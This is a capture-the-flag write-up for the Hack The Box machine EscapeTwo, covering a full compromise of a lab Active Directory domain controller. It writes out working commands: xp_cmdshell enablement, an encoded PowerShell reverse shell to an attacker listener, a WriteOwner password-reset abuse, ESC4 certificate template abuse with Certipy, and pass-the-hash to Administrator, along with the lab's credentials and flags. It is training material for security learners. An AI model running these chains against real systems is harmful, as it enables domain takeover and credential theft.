Author: Faridd

### HTB Write-Up: EscapeTwo

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/EscapeTwo)   |
| Difficulty | Easy                                                              |
| OS         | Windows                                                           |
| Date       | November 03, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Rustscan & Domain Setup](#1-reconnaissance--rustscan--domain-setup)
2. [Enumeration — SMB Shares & Credential Leak from Corrupted Excel Files](#2-enumeration--smb-shares--credential-leak-from-corrupted-excel-files)
3. [Initial Access — MSSQL as sa & RCE via xp_cmdshell](#3-initial-access--mssql-as-sa--rce-via-xp_cmdshell)
4. [Lateral Movement — Password Reuse to ryan via WinRM](#4-lateral-movement--password-reuse-to-ryan-via-winrm)
5. [Privilege Escalation (Part 1) — WriteOwner Abuse to Reset ca_svc](#5-privilege-escalation-part-1--writeowner-abuse-to-reset-ca_svc)
6. [Privilege Escalation (Part 2) — ESC4 Certificate Template Abuse to Domain Admin](#6-privilege-escalation-part-2--esc4-certificate-template-abuse-to-domain-admin)

---

#### 1. Reconnaissance — Rustscan & Domain Setup

```bash
rustscan -a 10.129.232.128 --ulimit=5000
```

**Open Ports:**

```
Open 10.129.232.128:53
Open 10.129.232.128:88
Open 10.129.232.128:135
Open 10.129.232.128:139
Open 10.129.232.128:389
Open 10.129.232.128:445
Open 10.129.232.128:464
Open 10.129.232.128:593
Open 10.129.232.128:636
Open 10.129.232.128:1433
Open 10.129.232.128:5985
Open 10.129.232.128:9389
```

The port set (Kerberos, LDAP, SMB, WinRM) confirms a **Domain Controller**, with an additional **MSSQL** service on port 1433 — unusual among the other AD machines in this series and a strong signal for the initial foothold. The domain was added to `/etc/hosts`:

```bash
echo "10.129.232.128 sequel.htb dc01.sequel.htb dc01" | sudo tee -a /etc/hosts
```

Starting credentials for the user `rose` (`KxEPkKe6R8su`) were available for this box and used to begin enumeration.

---

#### 2. Enumeration — SMB Shares & Credential Leak from Corrupted Excel Files

##### 2.1 — Share Enumeration

```bash
netexec smb 10.129.232.128 -u rose -p 'KxEPkKe6R8su' --shares
```

**Result:**

```
Share           Permissions     Remark
-----           -----------     ------
Accounting Department READ            
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
Users           READ            
```

The `Accounting Department` share stood out as non-default and readable.

##### 2.2 — Downloading Share Contents

```bash
smbclient //10.129.232.128/'Accounting Department' -U "rose%KxEPkKe6R8su"
smb: \> recurse on
smb: \> ls
```

**Result:**

```
accounting_2024.xlsx                A    10217
accounts.xlsx                       A     6780
```

```bash
smb: \> mget *
```

Both `.xlsx` files failed to open normally in Excel — they appeared corrupted.

##### 2.3 — Identifying the Real File Type

```bash
file accounts.xlsx
```

```
accounts.xlsx: Zip archive data, made by v2.0, extract using at least v2.0, last modified Jun 09 2024 10:47:44, uncompressed size 681, method=deflate
```

An `.xlsx` is itself a ZIP container, so the file was unzipped directly to get at its raw XML parts, bypassing whatever corruption was breaking Excel's own parser:

```bash
unzip accounts.xlsx
```

This extracted the underlying OOXML structure, including `xl/sharedStrings.xml` — the file Excel uses to store all literal text/string values in a workbook.

##### 2.4 — Extracting Credentials from sharedStrings.xml

```bash
cd xl
cat sharedStrings.xml
```

**Result (parsed):**

| First Name | Username | Email | Password |
|---|---|---|---|
| Angela | angela | angela@sequel.htb | `0fwz7Q4mSpurIt99` |
| Oscar | oscar | oscar@sequel.htb | `86LxLBMgEWaKUnBG` |
| Kevin | kevin | kevin@sequel.htb | `Md9Wlq1E5bZnVDVo` |
| (service account) | sa | sa@sequel.htb | `MSSQLP@ssw0rd!` |

Four credential sets were recovered directly from the spreadsheet's raw XML — most notably `sa`, the MSSQL service account, which lines up with the open 1433 port found during recon.

---

#### 3. Initial Access — MSSQL as sa & RCE via xp_cmdshell

##### 3.1 — Authenticating to MSSQL

```bash
impacket-mssqlclient sequel.htb/sa@10.129.232.128
```

Login succeeded as `sa` — the SQL Server built-in system administrator account.

##### 3.2 — Enabling xp_cmdshell

`xp_cmdshell` is disabled by default for security reasons, so it first had to be re-enabled via `sp_configure`:

```sql
EXEC xp_cmdshell 'whoami';
-- blocked: component is turned off

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Result:**

```
output           
--------------   
sequel\sql_svc   
```

With `sa` privileges, advanced options could be toggled and `xp_cmdshell` enabled, giving OS-level command execution as `sequel\sql_svc`.

##### 3.3 — Reverse Shell via xp_cmdshell

A listener was started locally:

```bash
rlwrap nc -nvlp 4444
```

A Base64-encoded PowerShell reverse shell payload was then executed through `xp_cmdshell`:

```sql
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4A<SNIP>';
```

This returned a shell as `sql_svc`:

```
connect to [10.10.14.25] from (UNKNOWN) [10.129.232.128] 49751
PS C:\Windows\system32>
```

##### 3.4 — Finding Reusable Credentials in the SQL Install Config

Enumeration of the local filesystem turned up the original SQL Server unattended-install configuration file:

```powershell
type sql-Configuration.INI
```

**Relevant contents:**

```ini
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SAPWD="MSSQLP@ssw0rd!"
```

This leaked the plaintext password originally set for the `sql_svc` domain account, `WqSZAF6CysDQbGb3` — a strong candidate for password reuse against other domain users.

---

#### 4. Lateral Movement — Password Reuse to ryan via WinRM

The `sql_svc` password was tried against other known/guessed accounts, on the theory that passwords may have been reused across service and user accounts:

```bash
evil-winrm -i 10.129.232.128 -u ryan -p 'WqSZAF6CysDQbGb3'
```

The password worked for the domain user `ryan`, granting a WinRM shell directly.

##### 4.1 — User Flag

```powershell
*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
2e69ddb8389becd5dc69497eb0d841f1
```

##### 4.2 — Privilege Check

```powershell
whoami /all
```

`ryan`'s local privileges offered nothing directly useful for escalation, so the next step was to check `ryan`'s **Active Directory object permissions** rather than local Windows privileges.

---

#### 5. Privilege Escalation (Part 1) — WriteOwner Abuse to Reset ca_svc

BloodHound-style analysis of `ryan`'s AD permissions revealed that `ryan` holds **WriteOwner** over the `ca_svc` account — and `ca_svc` is itself a member of the **Cert Publishers** group, which is significant given the domain runs **Active Directory Certificate Services (AD CS)**.

##### 5.1 — Taking Ownership and Granting ResetPassword

Using PowerView from an existing WinRM session as `ryan`:

```powershell
. .\PowerView.ps1
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
```

`WriteOwner` allowed `ryan` to make themself the owner of the `ca_svc` object, which in turn allowed granting themself an explicit `ResetPassword` right over it — a classic AD ACL abuse chain (WriteOwner → grant self ResetPassword → reset the account).

##### 5.2 — Resetting the Password

```powershell
$cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```

```bash
netexec smb 10.129.232.128 -u ca_svc -p 'Password123!!'
# [+] sequel.htb\ca_svc:Password123!!
```

Access to `ca_svc` was confirmed.

---

#### 6. Privilege Escalation (Part 2) — ESC4 Certificate Template Abuse to Domain Admin

Because `ca_svc` belongs to **Cert Publishers**, the next logical step was to check the domain's AD CS configuration for template misconfigurations using **Certipy**.

##### 6.1 — Finding Vulnerable Templates

```bash
certipy find -u ca_svc@sequel.htb -p 'Password123!!' -dc-ip 10.129.232.128 -vulnerable
```

**Key finding:**

```
Template Name                       : DunderMifflinAuthentication
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

This is an **ESC4** condition: `Cert Publishers` (which `ca_svc` belongs to) has excessive write permissions over the `DunderMifflinAuthentication` certificate template's configuration object. Since a principal with write access to a template can rewrite its security settings, the template can be reconfigured into a vulnerable state (e.g. allowing client authentication with attacker-supplied Subject Alternative Names) and then abused like a classic ESC1 template.

##### 6.2 — Overwriting the Template to a Vulnerable Configuration

```bash
certipy template -u ca_svc@sequel.htb -p 'Password123!!' -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -write-default-configuration
```

Certipy backed up the existing template configuration and rewrote it to a default, exploitable configuration (client-authentication EKU, enrollee-supplied subject allowed).

##### 6.3 — Requesting a Certificate as Administrator

```bash
certipy req -u ca_svc@sequel.htb -p 'Password123!!' -dc-ip 10.129.232.128 -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

Because the weakened template now allows the requester to supply an arbitrary UPN in the certificate's SAN, a certificate was issued that is valid for authenticating as `administrator@sequel.htb`, despite being requested by `ca_svc`.

##### 6.4 — Authenticating with the Certificate

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.232.128
```

**Result:**

```
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Certipy used the certificate to request a TGT via PKINIT and recovered the Administrator's NT hash through UnPAC-the-hash.

##### 6.5 — Root Flag via Pass-the-Hash

```bash
evil-winrm -i 10.129.232.128 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1205a097e5b1fec4cba746cadfc47e8a
```
